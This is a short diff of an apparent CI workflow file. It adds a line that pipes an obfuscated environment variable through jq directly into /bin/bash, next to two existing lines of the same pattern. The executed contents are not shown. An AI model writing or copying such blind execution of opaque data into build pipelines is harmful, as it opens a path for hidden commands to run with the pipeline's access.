@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$opsd64" | jq -r .np4 | /bin/bash
           printf '%s' "$pqifg5" | jq -r .pded375 | /bin/bash
+          echo $ecvhi9 | jq -r .sq3089 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
